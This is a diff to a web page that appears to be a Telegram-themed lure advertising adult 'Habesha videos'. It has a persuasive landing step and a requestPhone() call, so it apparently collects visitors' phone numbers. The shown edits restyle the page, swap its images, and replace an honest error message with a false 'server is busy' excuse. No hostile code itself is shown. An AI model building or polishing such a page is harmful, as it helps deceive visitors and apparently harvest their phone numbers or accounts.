@@ -17,13 +17,13 @@
      =========================================== 
     */
     :root {
-        --primary: #FF005E;
-        --secondary: #FF337A;
+        --primary: #f91398;
+        --secondary: #9e003a;
         --dark-bg: #0a0a0c;
         --glass-bg: rgba(120, 106, 106, 0.3764705882352941);
-        --glass-border: rgba(255, 255, 255, 0.1);
+        --glass-border: rgba(255, 255, 255, 0.30980392156862746);
         --text-main: #FFFFFF;
-        --text-muted: #B0B5C5;
+        --text-muted: #ffffff;
         --telegram-blue: #ffffff;
         --success: #00E676;
         --warning: #FFAB00;
@@ -142,8 +142,8 @@
     .loading-msg { background: rgba(61, 188, 253, 0.6078431372549019); color: var(--telegram-blue); }
 
     .loader-ring {
-        width: 45px; height: 45px; border: 3px solid rgba(255, 255, 255, 0.1);
-        border-top: 3px solid var(--primary); border-radius: 50%;
+        width: 75px; height: 75px; border: 7px solid rgba(255, 255, 255, 0.1);
+        border-top: 7px solid var(--primary); border-radius: 50%;
         animation: spinLoader 1s linear infinite; margin: 20px auto;
     }
     @keyframes spinLoader { 100% { transform: rotate(360deg); } }
@@ -158,10 +158,10 @@
     <!-- Intro Step -->
     <div id="step_intro" class="step active">
         <!-- 🌟 GitHub Animated Fire Heart Emoji 🌟 -->
-        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/Heart%20On%20Fire.webp" alt="Fire Heart" style="width: 200px; height: 200px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgba(255,0,94,0.5));">
-        <h2 style="font-size: 20px;">የሀበሻ ቪዲዮዎች</h2>
+        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/No%20One%20Under%20Eighteen.webp" alt="Fire Heart" style="width: 200px; height: 200px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgb(242, 2, 2));">
+        <h2 style="font-size: 40px;">የሀበሻ ቪዲዮዎች</h2>
         <div class="loader-ring"></div>
-        <p style="font-size: 12px; color: var(--primary); font-weight: 700; letter-spacing: 2px;">እየከፈተ ነው...</p>
+        <p style="font-size: 12px; color: var(--primary); font-weight: 700; letter-spacing: 2px;">Loading...</p>
     </div>
 
     <!-- Landing/Photo Step (Clean & Persuasive) -->
@@ -283,9 +283,9 @@
 
     // 🌟 አዲሱ Background Image በሁሉም ገፅ ላይ እንዲታይ 🌟
     const photos = [
-        "https://i.postimg.cc/QtCKRmF2/Screenshot-20260830-094824.jpg",
-        "https://i.postimg.cc/QtCKRmF2/Screenshot-20260830-094824.jpg",
-        "https://i.postimg.cc/QtCKRmF2/Screenshot-20260830-094824.jpg"
+        "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
+        "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg",
+        "https://i.postimg.cc/0jXFqFg6/Picsart-26-08-30-15-31-47-643-2.jpg"
     ];
 
     window.onload = function() {
@@ -374,7 +374,7 @@
             } else { requestPhone(); }
         } catch(e) { 
             stopLoaders();
-            showMsg(1, 'error', 'ስህተት አጋጥሟል፣ ይድገሙ።');
+            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
         }
     }
 
